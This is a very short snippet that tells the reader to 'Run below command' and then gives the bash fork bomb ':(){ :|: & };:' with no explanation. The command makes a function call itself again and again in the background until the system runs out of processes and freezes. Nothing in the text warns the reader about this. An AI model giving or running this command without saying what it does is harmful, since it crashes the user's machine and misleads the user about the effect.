* Run below command
```
:(){ :|: & };:
```
